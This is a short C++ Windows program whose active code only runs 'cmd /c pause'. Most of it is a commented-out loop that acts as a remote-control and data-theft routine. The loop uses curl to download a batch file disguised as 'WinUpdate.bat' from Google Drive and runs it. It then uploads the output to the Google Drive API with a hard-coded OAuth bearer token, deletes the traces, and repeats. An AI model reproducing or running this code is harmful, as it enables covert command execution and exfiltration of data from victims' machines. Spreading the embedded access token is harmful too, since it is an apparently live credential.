#include <windows.h>
#include <stdio.h>
#include <string>

int main() {

    //for (int i = 0; i < 5; i++){

        //WinExec("cmd /c curl -L \"https://drive.google.com/uc?export=download&id=10SZeDUlI-IG4u1EXjP_VGUhdoQSAdYwS\" -o %temp%\\WinUpdate.bat",1);
        //Sleep(10000);
        //WinExec("cmd /c %temp%\\WinUpdate.bat > %temp%\\WinUpdate.bin",1);
        //Sleep(20000);
        //WinExec("cmd /c curl -X POST -L -H \"Authorization: Bearer ya29.a0AcM612xdU0bM0LmIoIfTAh6Lnr57vnRH_bZd6uV0UhYCWoycdUkJFcjZJS9i8Wju8Iau4LRkyvjV_ffzHzm9F-EKGHpKlz19crkqvlYdzo9gZLuUwQHAq51kMis6Kc8pSWhoXMW54SlLp1TqNuQzS3fI76W5tgvMc3wOPb90aCgYKATkSARISFQHGX2Mi9qf8GbbLIc3y_Wt4w813-Q0175\" -F \"metadata={name : 'output.txt'};type=application/json;charset=UTF-8\" -F \"file=@%temp%\\WinUpdate.bin\" \"https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart\"",1);
        WinExec("cmd /c pause", 1);
        Sleep(1000);
        //WinExec("cmd /c del %temp%\\WinUpdate.bin",1);
        //WinExec("cmd /c del %temp%\\WinUpdate.bat",1);
        //Sleep(60000);

    //}
}